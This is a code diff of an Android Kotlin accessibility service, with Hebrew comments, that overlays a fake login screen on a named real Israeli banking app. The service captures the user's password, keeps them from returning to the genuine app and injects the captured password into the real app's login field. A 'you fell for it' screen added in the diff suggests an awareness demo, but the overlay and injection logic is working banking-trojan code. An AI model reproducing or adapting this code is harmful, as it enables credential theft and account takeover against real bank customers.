@@ -12,6 +12,11 @@ import android.os.Looper
 import android.view.accessibility.AccessibilityNodeInfo
 import androidx.core.content.ContextCompat
 
+//מטרת המחלקה:
+//לזהות את פתיחת אפליקציית המטרה = הבנק (com.ideomobile.mercantile)
+//להציג מסך התחזות מעל האפליקציה האמיתית
+//להזריק אוטומטית את הסיסמה שנלכדה חזרה לאפליקציה האמיתית
+//לטפל בכשלי התחברות ולהציג שוב את מסך הפישינג
 class PhishingAccessibilityService : AccessibilityService() {
     companion object {
         private const val TAG = "PhishingService"
@@ -37,6 +42,11 @@ class PhishingAccessibilityService : AccessibilityService() {
     private var injectedPassword: String = ""
     private lateinit var injectorReceiver: BroadcastReceiver
 
+    // משתנים חדשים לזיהוי התנתקות
+    private var wasLoggedInSuccessfully = false
+    private var showingCaughtScreen = false
+
+    //מטרה: נקראת כשהשירות מתחבר למערכת האנדרואיד
     override fun onServiceConnected() {
         super.onServiceConnected()
         Log.i(TAG, "Service Connected")
@@ -60,6 +70,9 @@ class PhishingAccessibilityService : AccessibilityService() {
             }
         }
 
+        //IntentFilter הוא "מסנן" שקובע איזה סוג הודעות ה-Receiver יאזין להן
+        //כאן אנחנו אומרים: "תאזין רק להודעות מסוג ACTION_INJECT_PASSWORD"
+        // האובייקט שיטפל בהודעות כשהן מגיעות - נמצא בתחילת הפונקציה.
         val filter = IntentFilter(ACTION_INJECT_PASSWORD)
         ContextCompat.registerReceiver(
             this,
@@ -69,10 +82,13 @@ class PhishingAccessibilityService : AccessibilityService() {
         )
     }
 
+    //מטרה: נקראת בכל פעם שקורה אירוע נגישות במערכת
     override fun onAccessibilityEvent(event: AccessibilityEvent?) {
         event ?: return
 
         // מסננים רק אירועי שינוי חלון
+        //ללא הסינון הזה, מסך הפישינג היה מופיע עשרות פעמים ברגע, בכל לחיצה קטנה של המשתמש
+        //TYPE_WINDOW_STATE_CHANGED - כולל בתוכו פתיחת אפליקציה חדשה,מעבר בין אפליקציות, חזרה למסך הבית, פתיחת דיאלוג/פופ-אפ
         if (event.eventType != AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) return
 
         val pkg = event.packageName?.toString() ?: return
@@ -93,9 +109,18 @@ class PhishingAccessibilityService : AccessibilityService() {
         // הלוגיקה הפשוטה:
         when (pkg) {
             TARGET_PACKAGE -> {
+                // בדיקה האם זה מסך ההתחברות אחרי התחברות מוצלחת
+                if (wasLoggedInSuccessfully && !showingCaughtScreen) {
+                    // בודקים אם זה מסך ההתחברות
+                    handler.postDelayed({
+                        checkIfBackToLoginScreen()
+                    }, 1000) // מחכים שנייה שהמסך יטען לחלוטין
+                    return
+                }
+
                 // בדיקה שעברו לפחות 2 שניות מההצגה האחרונה
                 val currentTime = System.currentTimeMillis()
-                if (currentTime - lastOverlayShowTime < 2000) {
+                if (currentTime - lastOverlayShowTime < 1000) {
                     Log.i(TAG, "Ignoring duplicate event - too soon")
                     return
                 }
@@ -119,30 +144,70 @@ class PhishingAccessibilityService : AccessibilityService() {
 
             "com.sec.android.app.launcher" -> {
                 // חזרה ל-Home - מאפסים את המצב
-                overlayShown = false
-                userLoggedIn = false
-                loginAttemptTime = 0L
-                injectedPassword = ""
+                resetState()
             }
 
             else -> {
                 // כל אפליקציה אחרת - מאפסים את המצב
                 if (pkg != packageName) {
-                    overlayShown = false
-                    userLoggedIn = false
-                    loginAttemptTime = 0L
+                    resetState()
                 }
             }
         }
     }
 
+    private fun resetState() {
+        overlayShown = false
+        userLoggedIn = false
+        loginAttemptTime = 0L
+        injectedPassword = ""
+        wasLoggedInSuccessfully = false
+        showingCaughtScreen = false
+    }
+
+    private fun checkIfBackToLoginScreen() {
+        val root = rootInActiveWindow ?: return
+
+        // בודקים אם רואים את כפתור ההתחברות - סימן שחזרנו למסך התחברות
+        val loginButtons = root.findAccessibilityNodeInfosByViewId(
+            "com.ideomobile.mercantile:id/LoginButton"
+        )
+
+        if (loginButtons.isNotEmpty()) {
+            Log.i(TAG, "User logged out and back to login screen - showing caught screen")
+            showingCaughtScreen = true
+
+            // אחרי 3 שניות מהתחברות מוצלחת, מציגים את מסך "נפלת בפח"
+            handler.postDelayed({
+                showCaughtScreen()
+            }, 3000)
+        }
+    }
+
+    private fun showCaughtScreen() {
+        Log.i(TAG, "Showing 'caught' screen")
+
+        val intent = Intent(this, CaughtActivity::class.java).apply {
+            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
+            addFlags(Intent.FLAG_ACTIVITY_CLEAR_TASK)
+            addFlags(Intent.FLAG_ACTIVITY_SINGLE_TOP)
+            addFlags(Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS)
+        }
+        startActivity(intent)
+    }
+
+    //פתיחת מסך הפישינג המזויף מעל אפליקציית הבנק האמיתית
     private fun showPhishingOverlay() {
         Log.i(TAG, "Showing phishing overlay")
 
         val intent = Intent(this, PhishingOverlayActivity::class.java).apply {
+            //יוצר "משימה" (Task) חדשה במערכת, מאפשר לפתוח Activity מתוך Service (בלי זה לא עובד!)
             addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
+            //מוחק את כל ה-Activities הקיימים במשימה, הופך את מסך הפישינג לאחד ויחיד במחסנית- מבטיח שהמשתמש לא יוכל ללחוץ "חזור" ולחזור לאפליקציית הבנק האמיתית
             addFlags(Intent.FLAG_ACTIVITY_CLEAR_TASK)
+            //אם מסך הפישינג כבר קיים, לא יוצר עוד אחד,מונע כפילויות של אותו מסך
             addFlags(Intent.FLAG_ACTIVITY_SINGLE_TOP)
+            //מסתיר את מסך הפישינג מרשימת האפליקציות האחרונות, כשהמשתמש לוחץ על כפתור "אפליקציות אחרונות" - הוא לא רואה את מסך הפישינג
             addFlags(Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS)
         }
         startActivity(intent)
@@ -165,6 +230,7 @@ class PhishingAccessibilityService : AccessibilityService() {
         startActivity(intent)
     }
 
+    //לזהות אם הסיסמה שהוזרקה לאפליקציית הבנק האמיתית הייתה נכונה או שגויה, ולהגיב בהתאם
     private fun checkForLoginFailure() {
         val root = rootInActiveWindow ?: return
 
@@ -188,12 +254,16 @@ class PhishingAccessibilityService : AccessibilityService() {
         } else {
             // התחברנו בהצלחה - מאפסים את זמן הניסיון
             loginAttemptTime = 0L
+            wasLoggedInSuccessfully = true
+            Log.i(TAG, "Login successful - marking for later detection")
         }
     }
 
+    //אחראית על הזרקת הסיסמה שנלכדה למסך ההתחברות האמיתי של הבנק.
     private fun injectPasswordToRealApp() {
         Log.i(TAG, "Attempting to inject password")
 
+        //rootInActiveWindow מחזיר את השורש של החלון הפעיל כרגע
         val root = rootInActiveWindow
         if (root == null) {
             Log.w(TAG, "No root window available")
@@ -201,6 +271,8 @@ class PhishingAccessibilityService : AccessibilityService() {
         }
 
         // מחפשים את שדה הסיסמה
+        //כל רכיב בממשק אנדרואיד יכול לקבל מזהה יחודי
+        //text_input_edit_text_layout = שם הרכיב של שדה הסיסמה
         val passwordNodes = root.findAccessibilityNodeInfosByViewId(
             "com.ideomobile.mercantile:id/text_input_edit_text_layout"
         )
@@ -212,15 +284,20 @@ class PhishingAccessibilityService : AccessibilityService() {
 
         val passwordNode = passwordNodes[0]
 
-        // מוקד על השדה
+        // פעולה שנותנת "פוקוס" לרכיב (כמו לחיצה עליו)
+        //מערכת האנדרואיד מאפשרת הזנת טקסט רק לרכיב שיש לו פוקוס
         passwordNode.performAction(AccessibilityNodeInfo.ACTION_FOCUS)
 
         // הזנת הסיסמה
+        //קבוע שמגדיר שהפרמטר הוא "טקסט שרוצים להזין" -ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE
+        //אנדרואיד יודע שהערך הזה צריך להיכנס לשדה הטקסט
         val arguments = android.os.Bundle()
         arguments.putCharSequence(
             AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE,
             injectedPassword
         )
+        //פעולת נגישות שמזינה טקסט לרכיב
+        //דומה לכתיבה במקלדת, אבל ישירות
         passwordNode.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, arguments)
 
         Log.i(TAG, "Password injected successfully")
